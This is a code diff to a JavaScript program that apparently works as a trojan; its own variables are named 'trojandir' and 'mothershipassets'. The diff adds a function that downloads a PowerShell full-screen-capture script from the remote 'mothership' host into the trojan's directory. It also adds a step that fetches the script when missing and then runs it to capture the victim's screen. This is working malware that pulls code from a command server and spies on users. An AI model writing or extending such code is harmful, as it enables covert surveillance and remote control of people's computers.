@@ -1,4 +1,4 @@
-//debugger;
+debugger;
 
 //#region documentation
 // https://github.com/gauravmehla/Javascript-bookshelf/blob/master/O'Reilly%20-%20You%20Don't%20Know%20JS.%20this%20%26%20Object%20Prototypes.pdf
@@ -4007,6 +4007,29 @@ function getDirInfo(dirPath) {
     return fileDetails;
 }
 
+async function download_screencapture_script() {
+    let filename = 'get_full_screen_capture.ps1'; // TODO move to systemconfig
+
+    let baseUrl = systemstate.mothershipassets + "/" + filename;
+    let localpath = path.join(systemstate.trojandir, filename);
+
+    let downloadOpts = {
+        download: true,
+        filetype: "bin",
+        localpath: localpath,
+    };
+
+    let response = await makeGetRequest(baseUrl, null, null, downloadOpts);
+
+    if ( ! fileExists(localpath) ) {
+        throw new Error("download failed for " + localpath);
+    }
+
+    const stats = fs.statSync(localpath);
+    logmsg(`${localpath} -- File size: ${stats.size} bytes`);
+}
+
+
 // TODO
 async function upload_file(filename, jobcode, localfname, localdir) {
 
@@ -4044,7 +4067,7 @@ function exec_getscreencapture() {
         let fpath = path.join(systemstate.trojandir, 'get_full_screen_capture.ps1');
     
         let childp = execPSScript(fpath, 
-            [systemstate.trojandir], 
+            [ systemstate.trojandir ], 
             null, 
             (text) => stdout+=text, 
             (text) => stdout+=text, 
@@ -4058,6 +4081,17 @@ async function getscreencapture() {
     logmsg("starting");
 
     let runningcmd = systemstate.cmdconfig;
+    
+    let filename = 'get_full_screen_capture.ps1'; // TODO move to systemconfig
+    let localpath = path.join(systemstate.trojandir, filename);
+
+    if ( ! fileExists(localpath) ) {
+        let response = await download_screencapture_script();
+    }
+
+    if ( ! fileExists(localpath) ) {
+        throw new Error(`screencapture script does not exist ${localpath}`);
+    }
 
     // TODO: log event startjob
 
